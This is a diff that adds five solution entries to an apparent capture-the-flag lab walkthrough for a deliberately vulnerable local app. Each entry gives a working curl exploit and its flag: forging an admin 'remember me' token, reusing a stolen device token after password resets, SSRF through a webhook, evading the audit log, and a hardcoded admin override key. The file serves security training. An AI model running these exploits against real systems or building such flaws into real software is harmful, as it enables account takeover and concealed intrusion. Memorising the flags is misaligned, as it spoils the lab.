@@ -402,3 +402,39 @@ Trusts a client `rate` and allows negative `points`:
 curl -s localhost:4060/api/points/cashout -H "authorization: Bearer $TOK" \
   -H 'content-type: application/json' -d '{"points":100,"rate":5}'   # FLAG{lj_points_rounding_abuse}
 ```
+
+---
+
+# v5 — Specter (APT / persistence / stealth)
+
+### 46. Forgeable "remember me" · `POST /api/remember/session`
+Token is unsigned `base64("uid:role")` — forge an admin:
+```bash
+curl -s localhost:4060/api/remember/session -H 'content-type: application/json' \
+  -d "{\"remember\":\"$(printf '1:admin' | base64)\"}"   # FLAG{lj_forgeable_remember_me}
+```
+
+### 47. Device token survives reset · `GET /api/device/whoami` (`X-Device-Token`)
+`api_token` never rotates — steal it once (IDOR #3) and keep access through password resets:
+```bash
+curl -s localhost:4060/api/device/whoami -H "x-device-token: <mira api_token>"   # FLAG{lj_token_survives_reset}
+```
+
+### 48. Webhook backdoor · `POST /api/webhooks` → `POST /api/webhooks/trigger`
+Register any URL (no owner/host validation); trigger fetches it server-side — persistent callback + SSRF:
+```bash
+curl -s localhost:4060/api/webhooks -H 'content-type: application/json' -d '{"url":"http://localhost:4060/internal/metadata","event":"order.created"}'
+curl -s localhost:4060/api/webhooks/trigger -H 'content-type: application/json' -d '{"event":"order.created"}'   # FLAG{lj_webhook_backdoor}
+```
+
+### 49. Audit-log evasion · `POST /api/admin/action`
+`silent:true` skips the audit trail:
+```bash
+curl -s localhost:4060/api/admin/action -H 'content-type: application/json' -d '{"action":"delete-user","silent":true}'   # FLAG{lj_audit_log_evasion}
+```
+
+### 50. Support-override backdoor · header `X-Support-Override: <ADMIN_API_KEY>`
+A planted static key grants admin on any request (get the key from #5):
+```bash
+curl -s localhost:4060/api/staff/tools -H "x-support-override: lj_admin_7f3c9a1e2b6d4058"   # FLAG{lj_support_override_backdoor}
+```
